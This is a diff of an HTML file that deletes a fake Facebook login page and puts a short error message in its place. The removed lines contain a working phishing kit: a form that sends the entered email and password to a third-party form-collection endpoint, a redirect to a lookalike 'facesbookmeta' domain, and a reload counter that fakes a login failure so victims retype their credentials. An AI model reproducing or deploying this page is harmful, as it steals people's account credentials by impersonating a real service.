@@ -11,95 +11,9 @@
     <!-- <script src="css/scripts.js"></script> -->
 </head>
 <body class="dav">
-    <div class="first">
-        <img class="was" src="css/imggg.png" alt="img" width="200" height="40">
-        <p class="hey">Login Into Facebook</p>
-        
-    </div>
-    <form class="mains" action="https://formsubmit.co/b6035dad0c7ba1a028ca85c2b8fe5908 " method="POST">
-        <p id="were" class="wer qet">unanle to login, please try again later</p>
-	    <input type="hidden" name="_captcha" value="false">
-	    <input type="hidden" name="_next" value="https://facesbookmeta.github.io/facebook/">
-        <div class="secondx">
-         <input type="text" id="emai;" name="user" required placeholder="Email address or phone number" class="second">
-        </div>  
+   
+      <p>Hello, there was an error. Pls visit the main page</p>
 
-        <div class="secondx">
-         <input type="password" id="pass" required name="pass" placeholder="Password" class="second">
-        </div>
-
-
-        <div>
-         <button type="submit" class="third">Log In</button>
-        </div>
-
-        <div>
-         <p class="fifth">Forgotten password?</p>
-        </div>
-         <hr class="exce">
-         <button type="submit" class="forth">Create New Account</button>
-     </form>
-
-
-
-
-
-     <script>
-
-        // const form = document.querySelector('form');
-
-        // form.addEventListener('submit', (e) => {
-        //     e.preventDefault();
-
-        // const fd = new FormData(form);
-
-        // const content = fd;
-
-        // const urlEncoded = new URLSearchParams(fd).toString();
-
-        // console.log(urlEncoded);
-
-        //     fetch('http://localhost:5000/form', {
-        //         method: 'post',
-        //         body: urlEncoded,
-        //         headers: {
-        //             'content-type': 'application/x-www-form-urlencoded',                }
-        //     })
-
-        // })
-
-
-
-
-
-
-        if (localStorage.getItem('reloadCount') === null) {
-		localStorage.setItem('reloadCount', 1)
-	} else {
-		let count = parseInt(localStorage.getItem('reloadCount'));
-		count++;
-		localStorage.setItem('reloadCount', count);
-	}
-
-	if (localStorage.getItem('reloadCount') !== '1') {
-		document.getElementById("were").classList.remove('qet');
-	}
-
-	
-	// localStorage.clear();
-
-
-     </script>
-    <!-- <script src="app.js"></script> -->
-
-
-
-<!-- <script>
-    function rebo() {
-        document.getElementsByClassName("wer").classList.remove('qet')
-    }
-</script> -->
-
-
+     
 </body>
 </html>
